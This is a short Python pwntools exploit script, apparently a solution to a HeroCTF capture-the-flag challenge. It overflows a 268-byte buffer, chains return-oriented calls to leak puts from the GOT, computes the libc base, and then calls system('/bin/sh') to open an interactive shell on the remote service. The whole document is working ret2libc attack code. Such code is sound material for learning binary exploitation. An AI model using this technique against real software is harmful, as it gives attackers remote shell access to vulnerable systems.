#!/usr/bin/env python2

from pwn import *

libc = ELF('./libc-2.27.so')
elf = ELF('./chall')

# r = process('./chall')
r = remote('challs.heroctf.fr', 7003)

pop_ret = 0x0804901e # pop ebx ; ret
puts_plt = elf.sym['puts']
puts_got = elf.got['puts']
vuln = elf.sym['vuln'] # vuln function
pad = "A"*268

rop = pad
rop += p32(puts_plt)
rop += p32(pop_ret)
rop += p32(puts_got)
rop += p32(vuln)

r.recv()
r.sendline(rop)

# in this case we receive 4 lines with leak on the last one
leak = u32(r.recv().splitlines()[3])

libc_base = leak - libc.sym['puts']
leak_system = libc_base + libc.sym['system']
leak_binsh = libc_base + next(libc.search('/bin/sh'))

log.success('leaked libc_base = {}'.format(hex(libc_base)))

rop = pad
rop += p32(leak_system)
rop += p32(0) # does not matter
rop += p32(leak_binsh)

r.sendline(rop)

r.recv()
r.interactive()
